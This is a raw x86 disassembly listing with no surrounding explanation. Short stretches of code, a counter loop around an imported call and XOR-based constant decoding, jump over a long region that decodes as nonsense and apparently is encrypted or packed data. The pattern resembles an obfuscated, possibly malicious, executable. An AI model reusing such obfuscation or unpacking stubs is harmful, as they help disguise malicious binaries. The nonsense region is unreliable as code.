  40186d:	adc    DWORD PTR ds:0x430546,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	cmc    
  401915:	retf   0xb40e
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401958
  401921:	retf   0xe81c
  401924:	out    0xc4,al
  401926:	add    cl,BYTE PTR [esi]
  401928:	data16 cmp ah,BYTE PTR [ecx-0x52]
  40192c:	repz xchg edi,eax
  40192e:	popf   
  40192f:	ds stos BYTE PTR es:[edi],al
  401931:	icebp  
  401932:	fidivr WORD PTR ds:0x13b851ab
  401938:	mov    eax,0x76175701
  40193d:	(bad)  
  40193f:	push   0xf3dbaeaf
  401944:	jecxz  0x4018ee
  401946:	cmp    edx,DWORD PTR [edi-0x3d1a6fb2]
  40194c:	into   
  40194d:	mov    edx,0x470d97fa
  401952:	(bad)  
  401953:	addr16 adc eax,0x3a9b7f8e
  401959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195a:	inc    ebp
  40195b:	adc    ebx,DWORD PTR [edi+ebx*4]
  40195e:	fcmovb st,st(2)
  401960:	popf   
  401961:	sbb    ch,ah
  401963:	jmp    0x70e1:0xeaf2401b
  40196a:	popa   
  40196b:	call   0x6b55:0xcf6cea39
  401972:	sbb    edx,DWORD PTR [edi+0x79]
  401975:	test   eax,0xb8777cd8
  40197a:	sub    eax,0xb56429c2
  40197f:	xor    BYTE PTR [esi-0x4d3bd10e],cl
  401985:	test   BYTE PTR [eax-0x2c],ah
  401988:	daa    
  401989:	sub    DWORD PTR [ebp+0x73],0x8ff10c50
  401990:	rcr    bh,0xc7
  401993:	imul   ebx,DWORD PTR [ebp-0x64dca9a1],0x3d
  40199a:	push   ecx
  40199b:	js     0x4019c2
  40199d:	cmp    cl,BYTE PTR [edi-0x635c50a5]
  4019a3:	jae    0x401951
  4019a5:	jmp    0x40198e
  4019a7:	mov    edx,0x4c18e8a9
  4019ac:	ins    DWORD PTR es:[edi],dx
  4019ad:	cmc    
  4019ae:	jl     0x4019ab
  4019b0:	pop    edx
  4019b1:	pop    DWORD PTR [edi+0x7b]
  4019b4:	push   esi
  4019b5:	pop    ecx
  4019b6:	xchg   esp,esp
  4019b8:	push   esp
  4019b9:	call   FWORD PTR [eax]
  4019bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019bc:	xchg   DWORD PTR [esi+0x57],ebx
  4019bf:	push   esp
  4019c0:	xchg   ebx,eax
  4019c1:	sar    BYTE PTR [edi],1
  4019c3:	jae    0x401a43
  4019c5:	dec    esi
  4019c6:	fs cwde 
  4019c8:	loopne 0x4019c1
  4019ca:	je     0x401952
  4019cc:	fcmovne st,st(5)
  4019ce:	push   ebp
  4019cf:	or     eax,DWORD PTR [ebx+0x68780003]
  4019d5:	push   ds
  4019d6:	and    dl,dh
  4019d8:	(bad)  
  4019da:	push   edi
  4019db:	pop    ebp
  4019dc:	pop    ss
  4019dd:	sbb    ch,BYTE PTR [edi-0x3d]
  4019e0:	into   
  4019e1:	add    al,0x91
  4019e3:	mov    ebx,0xfc75218e
  4019e8:	gs cmc 
  4019ea:	call   0x63063c00
  4019ef:	add    eax,0x6f365f00
  4019f4:	jne    0x401a16
  4019f6:	clc    
  4019f7:	dec    esi
  4019f8:	pusha  
  4019f9:	sub    eax,0xaee0cd46
  4019fe:	mov    eax,ds:0xa3573f65
  401a03:	dec    esi
  401a04:	aaa    
  401a05:	(bad)
  401a0a:	aaa    
  401a0b:	(bad)  
  401a0c:	cwde   
  401a0d:	xchg   ebx,eax
  401a0e:	mov    cl,BYTE PTR [edi-0x19]
  401a11:	push   es
  401a12:	popf   
  401a13:	xor    eax,0x5eb6d4f4
  401a18:	fs test al,0xcc
  401a1b:	call   0xf2a5:0x829a798d
  401a22:	cdq    
  401a23:	shr    BYTE PTR [eax-0x77],cl
  401a26:	or     BYTE PTR [edi],0x5d
  401a29:	mov    es,WORD PTR [eax+0x7d]
  401a2c:	fldcw  WORD PTR [edi]
  401a2e:	xchg   ebp,eax
  401a2f:	fdiv   QWORD PTR [esi-0x54]
  401a32:	xchg   ebx,ebp
  401a34:	cdq    
  401a35:	arpl   WORD PTR [edx+0x7b],dx
  401a38:	mov    ebp,0xde5df6e1
  401a3d:	dec    BYTE PTR [esi]
  401a3f:	aad    0x87
  401a41:	mov    cl,0x11
  401a43:	enter  0x21f5,0xd1
  401a47:	add    ebx,ecx
  401a49:	mov    ax,ds:0xdfa48897
  401a4f:	pushf  
  401a50:	fist   WORD PTR [edx-0x21]
  401a53:	shl    DWORD PTR [eax+eax*1],cl
  401a56:	pusha  
  401a57:	test   al,0x6c
  401a59:	imul   eax,DWORD PTR [edi+eiz*4],0x85f28c5e
  401a60:	cmp    bh,BYTE PTR [ebx+0x5f2115bf]
  401a66:	outs   dx,DWORD PTR ds:[esi]
  401a67:	scas   al,BYTE PTR es:[edi]
  401a68:	mov    ebx,0xc14bca9e
  401a6d:	xor    DWORD PTR [edx],ebp
  401a6f:	mov    dh,0xfa
  401a71:	stc    
  401a72:	xor    BYTE PTR [esp+esi*8-0x39],bl
  401a76:	ret    0x856b
  401a79:	xor    al,0xee
  401a7b:	inc    ecx
  401a7c:	sbb    edi,DWORD PTR [edx]
  401a7e:	pop    edx
  401a7f:	mov    bl,0x61
  401a81:	mov    al,BYTE PTR [eax-0x54]
  401a84:	sbb    eax,0x902007f0
  401a89:	retf   
  401a8a:	dec    esp
  401a8b:	dec    ecx
  401a8c:	(bad)  
  401a8d:	mov    bl,0x96
  401a8f:	sbb    BYTE PTR [edx+esi*1+0x35],al
  401a93:	add    esi,ebx
  401a95:	push   ebx
  401a96:	sub    eax,0xab4efadf
  401a9b:	add    dl,BYTE PTR [ecx]
  401a9d:	rol    ah,0x20
  401aa0:	popa   
  401aa1:	xor    al,0xe8
  401aa3:	(bad)  
  401aa4:	xor    DWORD PTR [esi+0x1781d477],edx
  401aaa:	mov    edi,0xab9ef4d2
  401aaf:	(bad)  
  401ab0:	xor    ebp,DWORD PTR [ecx+0x19]
  401ab3:	jmp    0x401ad9
  401ab5:	popa   
  401ab6:	mov    al,0x86
  401ab8:	sub    DWORD PTR [ebx+0x8],ecx
  401abb:	push   0xffffffbd
  401abd:	rol    BYTE PTR [ebp+0x1594b657],1
  401ac3:	xchg   esp,eax
  401ac4:	mov    WORD PTR [eiz*4-0x135bf48d],es
  401acb:	in     eax,dx
  401acc:	lock xchg esp,eax
  401ace:	xchg   esi,eax
  401acf:	cmp    dh,BYTE PTR [ebp+0x2b]
  401ad2:	or     bl,ch
  401ad4:	push   ecx
  401ad5:	or     eax,0x1d001186
  401ada:	inc    DWORD PTR [ebp-0xf69bea6]
  401ae0:	aas    
  401ae1:	ficomp WORD PTR [edi+edx*1-0x40]
  401ae5:	lahf   
  401ae6:	aaa    
  401ae7:	sbb    al,0x12
  401ae9:	call   0x6b9d7859
  401aee:	aas    
  401aef:	int3   
  401af0:	cmp    al,0xcf
  401af2:	cmp    BYTE PTR [ebp-0x71c1514b],ch
  401af8:	sbb    dh,dl
  401afa:	enter  0x16a7,0x88
  401afe:	push   eax
  401aff:	jns    0x401acb
  401b01:	iret   
  401b02:	sbb    dl,cl
  401b04:	cs mov dh,0xd3
  401b07:	aad    0xdf
  401b09:	ins    DWORD PTR es:[edi],dx
  401b0a:	cmp    al,0x85
  401b0d:	jmp    0x60c5:0x7218b2b8
  401b14:	push   edx
  401b15:	pushf  
  401b16:	test   al,0xbd
  401b18:	test   BYTE PTR [edi+0x18],0x4a
  401b1c:	sbb    al,0x33
  401b1e:	mov    ds:0x9430fbfc,al
  401b23:	outs   dx,BYTE PTR ds:[esi]
  401b24:	ret    0x5504
  401b27:	cmp    ebp,DWORD PTR [edx-0x2a8c7a94]
  401b2d:	cmc    
  401b2e:	cmp    BYTE PTR [eax+edx*8],ah
  401b31:	daa    
  401b32:	jno    0x401adf
  401b34:	in     al,dx
  401b35:	je     0x401b49
  401b37:	inc    di
  401b39:	jb     0x401b92
  401b3b:	sub    cl,ch
  401b3d:	(bad)  
  401b3e:	ins    DWORD PTR es:[edi],dx
  401b3f:	sar    BYTE PTR [edi+0x7f],0x11
  401b43:	xor    eax,DWORD PTR [edi]
  401b45:	pop    esi
  401b46:	and    esp,DWORD PTR [ebx+ebx*4]
  401b49:	loope  0x401b59
  401b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b4c:	in     eax,0x5e
  401b4e:	fisttp DWORD PTR [eax+0x0]
  401b51:	cmc    
  401b52:	jns    0x401bab
  401b54:	xor    ah,dh
  401b56:	test   al,0x98
  401b58:	mov    al,ds:0xe7fd0a9
  401b5d:	pop    eax
  401b5e:	pop    edx
  401b5f:	jg     0x401b86
  401b61:	adc    DWORD PTR [esi],eax
  401b63:	xor    DWORD PTR [eax+0x36],esp
  401b66:	inc    ebx
  401b67:	mov    BYTE PTR [ecx-0x62],bl
  401b6a:	pop    es
  401b6b:	into   
  401b6c:	mov    edi,0xd3edf987
  401b71:	cld    
  401b72:	je     0x401b78
  401b74:	arpl   WORD PTR ds:0x8f0f4175,si
  401b7a:	popf   
  401b7b:	pop    es
  401b7c:	aaa    
  401b7d:	jne    0x401b6e
  401b7f:	lea    edi,[ebx+ecx*1-0x2e]
  401b83:	mov    eax,ds:0xe0f87540
  401b88:	add    bh,BYTE PTR [ecx]
  401b8a:	mov    esp,0x501e1312
  401b8f:	mov    ds:0x93e9c873,al
  401b94:	and    ch,cl
  401b96:	sbb    edx,ebx
  401b98:	inc    ebx
  401b99:	stc    
  401b9a:	mov    ds:0x138e6c90,eax
  401b9f:	stos   BYTE PTR es:[edi],al
  401ba0:	sbb    ah,BYTE PTR [edi-0x21ee35cc]
  401ba6:	jae    0x401bd3
  401ba8:	fstp   DWORD PTR [edi-0x29]
  401bab:	sahf   
  401bac:	retf   
  401bad:	lahf   
  401bae:	into   
  401baf:	xor    BYTE PTR [ebp+0x463a2799],cl
  401bb5:	fstp   DWORD PTR gs:[esi+ebx*2]
  401bb9:	repz mov al,0x84
  401bbc:	mov    eax,ds:0x15171870
  401bc1:	repnz adc al,0xc5
  401bc4:	xchg   ebx,eax
  401bc5:	pop    edi
  401bc6:	lock and BYTE PTR [edi+eiz*1+0x9],0x45
  401bcc:	inc    edi
  401bcd:	jb     0x401bff
  401bcf:	dec    eax
  401bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bd1:	test   DWORD PTR [eax],edi
  401bd3:	mov    al,0x6b
  401bd5:	mov    ah,0xfd
  401bd7:	add    al,0x53
  401bd9:	add    edx,DWORD PTR [eax-0x79]
  401bdc:	jne    0x401c4f
  401bde:	adc    BYTE PTR [esp+ebx*8],bl
  401be1:	mov    eax,ds:0x37c4b2bc
  401be6:	mov    eax,0xc66178a7
  401beb:	popf   
  401bec:	jo     0x401c25
  401bee:	je     0x401bd9
  401bf0:	or     edi,DWORD PTR [ebx-0x54]
  401bf3:	into   
  401bf4:	push   0x1a393c29
  401bf9:	pop    ds
  401bfa:	add    bl,BYTE PTR [ebp-0x44]
  401bfd:	sbb    eax,0xbe62c174
  401c02:	or     al,0xd2
  401c04:	iret   
  401c05:	pop    edi
  401c06:	scas   eax,DWORD PTR es:[edi]
  401c07:	dec    esp
  401c08:	in     al,0xc6
  401c0a:	mov    ds:0x1e64d4c4,al
  401c0f:	cmovns edi,DWORD PTR [ecx+0x784a5ef7]
  401c16:	jno    0x401c82
  401c18:	ins    DWORD PTR es:[edi],dx
  401c19:	adc    eax,0x702f04ed
  401c1e:	inc    ebp
  401c1f:	push   ss
  401c20:	ret    0x9aa5
  401c23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c24:	and    BYTE PTR [edx+0x63764592],0x57
  401c2b:	ss adc dh,al
  401c2e:	shr    BYTE PTR [ecx],1
  401c30:	shr    DWORD PTR [ecx+0x21e85829],1
  401c36:	test   DWORD PTR [edx+eiz*1],0xb33131bf
  401c3d:	sbb    eax,0xec4043e8
  401c42:	mov    WORD PTR [edx+0x60],fs
  401c45:	and    bh,BYTE PTR [edi-0x68874b9c]
  401c4b:	mov    BYTE PTR [ecx-0x324e4d65],al
  401c51:	cld    
  401c52:	jno    0x401c92
  401c54:	cdq    
  401c55:	push   edx
  401c56:	scas   eax,DWORD PTR es:[edi]
  401c57:	jge    0x401c6b
  401c59:	mov    ebp,0xd0229940
  401c5e:	int3   
  401c5f:	mov    edx,0x3da1afe5
  401c64:	std    
  401c65:	jmp    0x92a29f22
  401c6a:	cmp    cl,ch
  401c6c:	add    al,0xc5
  401c6e:	aad    0x41
  401c70:	fld    DWORD PTR [eax+0xbb0e226]
  401c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c77:	fsubr  DWORD PTR [esi]
  401c79:	das    
  401c7a:	xor    eax,0x3c02276
  401c7f:	icebp  
  401c80:	jmp    0xf06e:0x3c41d904
  401c87:	xor    BYTE PTR [edi+0x6f7f1ca0],bh
  401c8d:	into   
  401c8e:	(bad)  
  401c8f:	fld    DWORD PTR [ecx]
  401c91:	pushf  
  401c92:	jbe    0x401ca7
  401c94:	jne    0x401cd8
  401c96:	loopne 0x401cbb
  401c98:	push   0x7406fc54
  401c9d:	retf   0xcf94
  401ca0:	scas   al,BYTE PTR es:[edi]
  401ca1:	cmp    al,0x75
  401ca3:	inc    edi
  401ca4:	inc    eax
  401ca5:	push   ecx
  401ca6:	xchg   esi,eax
  401ca7:	stc    
  401ca8:	sbb    ch,dl
  401caa:	sti    
  401cab:	daa    
  401cac:	jge    0x401cd9
  401cae:	xchg   edx,eax
  401caf:	push   esp
  401cb0:	ror    esi,cl
  401cb2:	retf   
  401cb3:	pop    ebp
  401cb4:	div    ebx
  401cb6:	mov    DWORD PTR ds:0x42ee20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401c9b
  401cd2:	pop    ecx
  401cd3:	stos   DWORD PTR es:[edi],eax
  401cd4:	sar    BYTE PTR [edx-0x7d8181f8],1
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401d42
  401cde:	jb     0x401d3c
  401ce0:	icebp  
  401ce1:	inc    esi
  401ce2:	mov    cl,0x39
  401ce4:	mov    edi,0x86cb7618
  401ce9:	pop    ebx
  401cea:	cmp    esp,DWORD PTR [ecx]
  401cec:	and    BYTE PTR [esi-0x73],dl
  401cef:	add    al,0xea
  401cf1:	adc    al,0x30
  401cf3:	dec    ebp
  401cf4:	das    
  401cf5:	push   ebx
  401cf6:	and    dl,dh
  401cf8:	sub    edi,ebp
  401cfa:	popa   
  401cfb:	or     edi,DWORD PTR ds:0x1c2c9a37
  401d01:	cmp    al,0xec
  401d03:	inc    esp
  401d04:	jle    0x401cc0
  401d06:	pop    ecx
  401d07:	outs   dx,BYTE PTR ds:[esi]
  401d08:	cmp    al,0x17
  401d0a:	int3   
  401d0b:	shl    BYTE PTR [esi-0x313a1a14],0x2c
  401d12:	pop    ebx
  401d13:	mov    bh,0x86
  401d15:	(bad)  
  401d16:	repnz cmp esi,DWORD PTR [edx+0x14]
  401d1a:	cwde   
  401d1b:	rcl    DWORD PTR [ebp+0x4abc61f5],1
  401d21:	xchg   DWORD PTR [eax+0x2365f1a],edi
  401d27:	pop    edi
  401d28:	mov    ch,0x6c
  401d2a:	sbb    DWORD PTR [edi-0x3b],ebx
  401d2d:	imul   ah
  401d2f:	pop    esp
  401d30:	rol    BYTE PTR [esp+eiz*4-0x74],1
  401d34:	aad    0x30
  401d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d38:	sub    DWORD PTR [ebx],edx
  401d3a:	loopne 0x401d67
  401d3c:	dec    edi
  401d3d:	pop    esp
  401d3e:	sbb    al,BYTE PTR [ecx-0x53]
  401d41:	leave  
  401d42:	or     ebp,DWORD PTR [ecx-0x2735ae45]
  401d48:	fs loopne 0x401d3b
  401d4b:	clc    
  401d4c:	and    esp,0xffffff89
  401d4f:	sub    eax,0x990bac8a
  401d54:	and    DWORD PTR [edi-0x44],esp
  401d57:	add    ebp,DWORD PTR [ebp-0x3cbcb328]
  401d5d:	mov    ch,bh
  401d5f:	jno    0x401d1f
  401d61:	enter  0xe683,0xd0
  401d65:	rep lods al,BYTE PTR ds:[esi]
  401d67:	imul   eax,DWORD PTR [esi],0x8a5f9039
  401d6d:	xor    dh,BYTE PTR [eax+eax*4+0x75]
  401d71:	(bad)  
  401d72:	pop    eax
  401d73:	inc    esi
  401d74:	out    0xa9,eax
  401d76:	popf   
  401d77:	test   DWORD PTR [edi+esi*2],ecx
  401d7a:	out    0xc4,eax
  401d7c:	sbb    esi,DWORD PTR [esi]
  401d7e:	cdq    
  401d7f:	push   eax
  401d80:	sbb    dl,bl
  401d82:	mov    ecx,0xdcec9314
  401d87:	sbb    al,0x9c
  401d89:	push   edx
  401d8a:	or     eax,0xb7e91948
  401d8f:	cwde   
  401d90:	lahf   
  401d91:	push   cs
  401d92:	aaa    
  401d93:	mov    esp,0xd4d343d6
  401d98:	mov    ebx,DWORD PTR [ecx+0x65]
  401d9b:	or     BYTE PTR [edi],cl
  401d9d:	popaw  
  401d9f:	add    DWORD PTR [edx],edx
  401da1:	jg     0x401d87
  401da3:	sub    DWORD PTR [eax-0x3ca2a345],0xffffffc4
  401daa:	js     0x401dbd
  401dac:	popa   
  401dad:	and    WORD PTR [edi-0x27065ddf],si
  401db4:	push   esi
  401db5:	(bad)  
  401db6:	hlt    
  401db7:	mov    bh,0x34
  401db9:	call   0xc2c6:0x4f12adf2
  401dc0:	cmp    BYTE PTR [esp+eiz*4+0x2635991a],ch
  401dc7:	adc    eax,0x1eb759de
  401dcc:	ret    0xb23b
  401dcf:	push   esp
  401dd0:	bound  ebp,QWORD PTR [edx+0x39]
  401dd3:	jne    0x401e33
  401dd5:	and    al,0x31
  401dd7:	sbb    eax,0xc2996934
  401ddc:	gs ret 0x18b0
  401de0:	xchg   BYTE PTR [ecx+0xd364d26],bl
  401de6:	outs   dx,DWORD PTR ds:[esi]
  401de7:	(bad)  
  401de8:	and    BYTE PTR [ebp+0x32],dl
  401deb:	xchg   eax,ebp
  401ded:	mov    ds:0xf35b83d0,al
  401df2:	jp     0x401df7
  401df4:	call   0xd4d60e2a
  401df9:	js     0x401d83
  401dfb:	dec    ecx
  401dfc:	lahf   
  401dfd:	arpl   WORD PTR [ebp-0x48],sp
  401e00:	imul   BYTE PTR [edi+ebp*1-0x52ec6f0e]
  401e07:	inc    edx
  401e08:	add    DWORD PTR [ebp-0x1bf41e01],esp
  401e0e:	shufps xmm3,XMMWORD PTR [ecx],0xf5
  401e12:	push   esi
  401e13:	(bad)  
  401e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e15:	in     al,dx
  401e16:	test   al,0xda
  401e18:	out    0xa3,al
  401e1a:	outs   dx,DWORD PTR es:[esi]
  401e1c:	loopne 0x401de3
  401e1e:	int    0x13
  401e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e21:	shl    DWORD PTR [ebp-0x11],1
  401e24:	js     0x401e8d
  401e26:	data16 repnz mov al,ds:0xb6663d0f
  401e2d:	scas   eax,DWORD PTR es:[edi]
  401e2e:	cmp    esp,DWORD PTR ds:0xfd708359
  401e34:	push   cs
  401e35:	xor    BYTE PTR [ecx-0x20],dl
  401e38:	mul    DWORD PTR [ebx]
  401e3a:	sub    al,0x4
  401e3c:	inc    esi
  401e3d:	mov    WORD PTR [ebx-0x37132f9c],?
  401e43:	pushf  
  401e44:	(bad)  
  401e45:	fld    TBYTE PTR [ebp-0x5e00e5cc]
  401e4b:	xor    BYTE PTR [ebx-0x6a58b2fd],cl
  401e51:	mov    DWORD PTR [esi],ecx
  401e53:	stc    
  401e54:	cwde   
  401e55:	jae    0x401e77
  401e57:	add    DWORD PTR [eax+0x6f842801],edx
  401e5d:	ror    DWORD PTR [ebp+0x631b68b5],cl
  401e63:	test   DWORD PTR [esi+eax*8-0x2e],esp
  401e67:	mov    esi,0x8e33b603
  401e6c:	jl     0x401ee1
  401e6e:	add    BYTE PTR [ecx],0xd6
  401e71:	out    dx,eax
  401e72:	bound  esi,QWORD PTR [edx+0x66]
  401e75:	inc    esp
  401e76:	das    
  401e77:	inc    ebx
  401e78:	and    dl,BYTE PTR [ecx+0x2c]
  401e7b:	inc    ecx
  401e7c:	push   ss
  401e7d:	add    DWORD PTR [ebx],eax
  401e7f:	out    0xf3,eax
  401e81:	repnz xchg edx,eax
  401e83:	add    cl,BYTE PTR [edx-0x2d]
  401e86:	cmp    ah,dl
  401e88:	xchg   esp,eax
  401e89:	shrd   DWORD PTR [esi+0x646c5789],ebp,cl
  401e90:	les    esi,FWORD PTR [ecx-0x433484e2]
  401e96:	xchg   edi,eax
  401e97:	mov    WORD PTR [edi-0x5ee50c1a],gs
  401e9d:	sbb    al,0x16
  401e9f:	push   0x61
  401ea1:	into   
  401ea2:	xor    DWORD PTR [esi-0x5e6c461b],0xffffff9d
  401ea9:	xor    eax,0xb0d40021
  401eae:	ret    
  401eaf:	sub    eax,0x821cafe0
  401eb4:	jno    0x401e71
  401eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb7:	fsub   DWORD PTR [eax+0x42]
  401eba:	sbb    esi,edx
  401ebc:	enter  0xa243,0xee
  401ec0:	xchg   edi,eax
  401ec1:	cmp    eax,ebp
  401ec3:	out    0x1e,al
  401ec5:	adc    BYTE PTR [ecx],al
  401ec7:	call   0xbcd6:0x42a9c619
  401ece:	jnp    0x401e98
  401ed0:	mov    ebx,0xc423e933
  401ed5:	adc    al,0x13
  401ed7:	push   ss
  401ed8:	lods   al,BYTE PTR es:[esi]
  401eda:	mov    edx,0xbc843672
  401edf:	sbb    esi,ebp
  401ee1:	(bad)  
  401ee2:	(bad)  
  401ee3:	popa   
  401ee4:	jne    0x401f62
  401ee6:	jge    0x401f58
  401ee8:	pop    esp
  401ee9:	add    DWORD PTR [ecx-0xd1a4cf0],esp
  401eef:	xor    ebx,DWORD PTR [edi]
  401ef1:	cdq    
  401ef2:	push   esi
  401ef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ef4:	sub    al,0xb4
  401ef6:	cmp    eax,0x657a804f
  401efb:	sub    DWORD PTR [esi+0x16839860],edx
  401f01:	ror    DWORD PTR [edi+eiz*2-0x1f7c0550],cl
  401f08:	cs leave 
  401f0a:	cmp    al,BYTE PTR [edi+eiz*8-0x16]
  401f0e:	test   eax,0x27417a1b
  401f13:	mov    cl,BYTE PTR [ebp-0x59]
  401f16:	arpl   WORD PTR [esp+ebp*1-0x71],bx
  401f1a:	pop    ecx
  401f1b:	pop    ebp
  401f1c:	bound  ebx,QWORD PTR ds:0x66ba4e8b
  401f22:	sub    eax,0xc68d5566
  401f27:	pop    ss
  401f28:	out    0xbf,al
  401f2a:	and    eax,0x9864e299
  401f2f:	mov    cl,BYTE PTR [eax+0x46]
  401f32:	ins    DWORD PTR es:[edi],dx
  401f33:	mov    al,0x8e
  401f35:	test   BYTE PTR ds:0x39c31858,bl
  401f3b:	dec    ebp
  401f3c:	pop    edi
  401f3d:	fisttp QWORD PTR [edx+0x4b82e285]
  401f43:	movq   QWORD PTR [edi],mm1
  401f46:	in     al,dx
  401f47:	(bad)  
  401f48:	cmp    eax,0xf041e2f4
  401f4d:	ret    0xed37
  401f50:	xchg   esp,eax
  401f51:	jo     0x401f95
  401f53:	inc    edi
  401f54:	lock les esp,FWORD PTR [esi+ebx*1]
  401f58:	sub    ebx,DWORD PTR [edx-0x237ccf4f]
  401f5e:	jb     0x401fba
  401f60:	fadd   QWORD PTR [eax]
  401f62:	mov    bh,0x72
  401f64:	and    eax,0xaa813559
  401f69:	shl    DWORD PTR [edi+0x33],cl
  401f6c:	inc    ebx
  401f6d:	mov    eax,ds:0x2672c6f
  401f72:	adc    edx,DWORD PTR [ebp+0x54c40f33]
  401f78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f79:	inc    edx
  401f7a:	push   es
  401f7b:	pop    ss
  401f7c:	test   BYTE PTR [edi-0x107fd7ba],0x9b
  401f83:	into   
  401f84:	stos   BYTE PTR es:[edi],al
  401f85:	call   0xfa8bd828
  401f8a:	add    al,0xe9
  401f8c:	adc    eax,0x84d76759
  401f91:	popf   
  401f92:	or     al,BYTE PTR [edi]
  401f94:	repz adc al,0x30
  401f97:	adc    al,0xb2
  401f99:	xchg   ebx,eax
  401f9a:	dec    ebp
  401f9b:	push   cs
  401f9c:	call   0xce1e:0x7efe264d
  401fa3:	js     0x401f94
  401fa5:	pop    eax
  401fa6:	outs   dx,BYTE PTR ds:[esi]
  401fa7:	cmp    DWORD PTR [ecx-0x54],0x97f337d5
  401fae:	jo     0x401f34
  401fb0:	xchg   DWORD PTR [ebx-0x7f],esp
  401fb3:	or     BYTE PTR [esi],al
  401fb5:	clc    
  401fb6:	xchg   ecx,eax
  401fb7:	sbb    ecx,DWORD PTR [edi+edi*1+0x1]
  401fbb:	in     eax,dx
  401fbc:	push   ebp
  401fbd:	inc    esi
  401fbe:	push   0xcc5925b8
  401fc3:	fdiv   DWORD PTR [edx-0x2c]
  401fc6:	inc    esp
  401fc7:	scas   eax,DWORD PTR es:[edi]
  401fc8:	stos   DWORD PTR es:[edi],eax
  401fc9:	mov    eax,DWORD PTR [edi]
  401fcb:	xchg   esi,eax
  401fcc:	and    BYTE PTR ds:0xceb85c11,ah
  401fd2:	sub    al,0xfd
  401fd4:	mov    dl,0x64
  401fd6:	or     cl,BYTE PTR [edx+esi*2+0x69]
  401fda:	sub    BYTE PTR [ebx],0xc5
  401fdd:	(bad)  
  401fde:	fsubr  DWORD PTR [ebp-0x80]
  401fe1:	xor    ebp,ecx
  401fe3:	ss inc ecx
  401fe5:	loopne 0x401fe5
  401fe7:	add    al,0x3f
  401fe9:	mov    cs,WORD PTR [ecx+0x7d]
  401fec:	or     bh,BYTE PTR [esi]
  401fee:	add    eax,0xff700159
  401ff3:	dec    DWORD PTR [ecx+0x58]
  401ff6:	pop    ss
  401ff7:	and    edi,DWORD PTR [edx-0x1]
  401ffa:	dec    esp
  401ffb:	jno    0x402025
  401ffd:	xchg   ebx,eax
  401ffe:	or     al,0xa3
  402000:	push   cs
  402001:	pushf  
  402002:	add    eax,edx
  402004:	or     ecx,ebp
  402006:	loopne 0x40201b
  402008:	adc    ebx,esp
  40200a:	dec    ecx
  40200b:	xor    BYTE PTR [ebx-0x713deb1e],ch
  402011:	fptan  
  402013:	shr    DWORD PTR [eax+0x72],1
  402016:	xor    ebp,DWORD PTR [ecx+0x41]
  402019:	pusha  
  40201a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40201b:	push   0xa8a1a2f7
  402020:	test   al,0xa7
  402022:	sub    bl,BYTE PTR ds:0xe1c76367
  402028:	and    BYTE PTR [eax-0x30],ah
  40202b:	mov    edi,0xaa3077bb
  402030:	adc    DWORD PTR [esi],esi
  402032:	je     0x401ff5
  402034:	pop    eax
  402035:	fs dec ecx
  402037:	adc    ebp,DWORD PTR [edx]
  402039:	out    dx,eax
  40203a:	stos   DWORD PTR es:[edi],eax
  40203b:	inc    esp
  40203c:	mov    bh,0x66
  40203e:	xchg   ebx,eax
  40203f:	add    eax,DWORD PTR [ebx+0xaad7594]
  402045:	lock add DWORD PTR ds:0x62687a1d,0x1b
  40204d:	pop    ds
  40204e:	ins    DWORD PTR es:[edi],dx
  40204f:	icebp  
  402050:	dec    esi
  402051:	lock pushf 
  402053:	xor    eax,0xecf0e61d
  402058:	(bad)  
  402059:	mov    bh,bl
  40205b:	push   eax
  40205c:	das    
  40205d:	call   0x64d3:0xbd4e7194
  402064:	sub    eax,0x7c53ec2d
  402069:	je     0x402060
  40206b:	retf   0x281
  40206e:	xchg   ecx,eax
  40206f:	outs   dx,DWORD PTR ds:[esi]
  402070:	jno    0x401ffd
  402072:	push   ebp
  402073:	loopne 0x40203c
  402075:	inc    ebp
  402076:	aam    0xb9
  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
